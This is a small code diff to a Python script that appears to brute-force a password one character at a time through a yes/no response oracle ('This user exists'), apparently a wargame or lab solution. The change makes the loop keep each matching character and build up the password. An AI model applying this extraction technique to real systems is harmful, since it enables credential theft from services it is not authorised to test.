@@ -15,9 +15,12 @@ def get_respones(character):
     respones = post(URL, data={}, auth=auth)
     if "This user exists" in respones.text:
         return character
-    return None
+    return ''
 
 
 while len(password) <= 32:
     for test_char in CHARS:
-        get_respones(test_char)
+        char = get_respones(test_char)
+        if char:
+            password += char
+            break
